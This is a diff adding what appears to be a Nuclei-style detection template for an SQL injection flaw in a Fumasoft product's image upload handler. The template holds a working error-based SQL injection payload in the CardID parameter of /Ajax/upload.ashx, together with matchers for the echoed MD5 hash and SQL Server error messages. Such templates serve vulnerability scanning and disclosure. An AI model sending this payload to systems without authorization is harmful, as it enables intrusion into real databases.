@@ -1,0 +1,35 @@
+id: poc-yaml-fumasoft-image-sqli
+
+info:
+  name: Fumasoft Image SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=image&CardID=1'and%201<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--&imagefb=FID HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "FumaCRM"
+          - ".image"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+    extractors:
+      - type: regex
+        name: error_message
+        regex:
+          - "转换成数据类型(.*?)时失败"
